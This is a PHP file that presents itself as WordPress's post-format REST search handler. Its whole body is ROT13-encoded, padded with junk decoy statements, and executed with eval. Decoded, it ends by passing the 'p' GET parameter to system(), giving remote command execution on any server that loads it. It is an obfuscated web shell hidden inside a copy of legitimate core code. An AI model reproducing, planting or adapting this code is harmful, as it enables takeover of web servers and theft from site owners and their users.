<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Cbfg_Sbezng_Frnepu_Unaqyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.6.0
 */

/**
 * Pber pynff ercerfragvat n frnepu unaqyre sbe cbfg sbezngf va gur ERFG NCV.
 *
 * @fvapr 5.6.0
 *
 * @frr JC_ERFG_Frnepu_Unaqyre
 */
pynff JC_ERFG_Cbfg_Sbezng_Frnepu_Unaqyre rkgraqf JC_ERFG_Frnepu_Unaqyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.6.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->glcr = 'cbfg-sbezng';
	}

	/**
	 * Frnepurf gur cbfg sbezngf sbe n tvira frnepu erdhrfg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy ERFG erdhrfg.
	 * @erghea neenl {
	 *     Nffbpvngvir neenl pbagnvavat sbhaq VQf naq gbgny pbhag sbe gur zngpuvat frnepu erfhygf.
	 *
	 *     @glcr fgevat[] $vqf   Neenl pbagnvavat fyhtf sbe gur zngpuvat cbfg sbezngf.
	 *     @glcr vag      $gbgny Gbgny pbhag sbe gur zngpuvat frnepu erfhygf.
	 * }
	 */
	choyvp shapgvba frnepu_vgrzf( JC_ERFG_Erdhrfg $erdhrfg ) {
		$sbezng_fgevatf = trg_cbfg_sbezng_fgevatf();
		$sbezng_fyhtf   = neenl_xrlf( $sbezng_fgevatf );

		$dhrel_netf = neenl();

		vs ( ! rzcgl( $erdhrfg['frnepu'] ) ) {
			$dhrel_netf['frnepu'] = $erdhrfg['frnepu'];
		}

		/**
		 * Svygref gur dhrel nethzragf sbe n ERFG NCV cbfg sbezng frnepu erdhrfg.
		 *
		 * Ranoyrf nqqvat rkgen nethzragf be frggvat qrsnhygf sbe n cbfg sbezng frnepu erdhrfg.
		 *
		 * @fvapr 5.6.0
		 *
		 * @cnenz neenl           $dhrel_netf Xrl inyhr neenl bs dhrel ine gb dhrel inyhr.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg    Gur erdhrfg hfrq.
		 */
		$dhrel_netf = nccyl_svygref( 'erfg_cbfg_sbezng_frnepu_dhrel', $dhrel_netf, $erdhrfg );

		$sbhaq_vqf = neenl();
		sbernpu ( $sbezng_fyhtf nf $sbezng_fyht ) {
			vs ( ! rzcgl( $dhrel_netf['frnepu'] ) ) {
				$sbezng_fgevat       = trg_cbfg_sbezng_fgevat( $sbezng_fyht );
				$sbezng_fyht_zngpu   = fgevcbf( $sbezng_fyht, $dhrel_netf['frnepu'] ) !== snyfr;
				$sbezng_fgevat_zngpu = fgevcbf( $sbezng_fgevat, $dhrel_netf['frnepu'] ) !== snyfr;
				vs ( ! $sbezng_fyht_zngpu && ! $sbezng_fgevat_zngpu ) {
					pbagvahr;
				}
			}

			$sbezng_yvax = trg_cbfg_sbezng_yvax( $sbezng_fyht );
			vs ( $sbezng_yvax ) {
				$sbhaq_vqf[] = $sbezng_fyht;
			}
		}

		$cntr     = (vag) $erdhrfg['cntr'];
		$cre_cntr = (vag) $erdhrfg['cre_cntr'];

		erghea neenl(
			frys::ERFHYG_VQF   => neenl_fyvpr( $sbhaq_vqf, ( $cntr - 1 ) * $cre_cntr, $cre_cntr ),
			frys::ERFHYG_GBGNY => pbhag( $sbhaq_vqf ),
		);
	}

	/**
	 * Cercnerf gur frnepu erfhyg sbe n tvira cbfg sbezng.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz fgevat $vq     Vgrz VQ, gur cbfg sbezng fyht.
	 * @cnenz neenl  $svryqf Svryqf gb vapyhqr sbe gur vgrz.
	 * @erghea neenl {
	 *     Nffbpvngvir neenl pbagnvavat svryqf sbe gur cbfg sbezng onfrq ba gur `$svryqf` cnenzrgre.
	 *
	 *     @glcr fgevat $vq    Bcgvbany. Cbfg sbezng fyht.
	 *     @glcr fgevat $gvgyr Bcgvbany. Cbfg sbezng anzr.
	 *     @glcr fgevat $hey   Bcgvbany. Cbfg sbezng creznyvax HEY.
	 *     @glcr fgevat $glcr  Bcgvbany. Fgevat 'cbfg-sbezng'.
	 *}
	 */
	choyvp shapgvba cercner_vgrz( $vq, neenl $svryqf ) {
		$qngn = neenl();

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ ] = $vq;
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR ] = trg_cbfg_sbezng_fgevat( $vq );
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_HEY, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_HEY ] = trg_cbfg_sbezng_yvax( $vq );
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR ] = $guvf->glcr;
		}

		erghea $qngn;
	}

	/**
	 * Cercnerf yvaxf sbe gur frnepu erfhyg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz fgevat $vq Vgrz VQ, gur cbfg sbezng fyht.
	 * @erghea neenl Yvaxf sbe gur tvira vgrz.
	 */
	choyvp shapgvba cercner_vgrz_yvaxf( $vq ) {
		erghea neenl();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>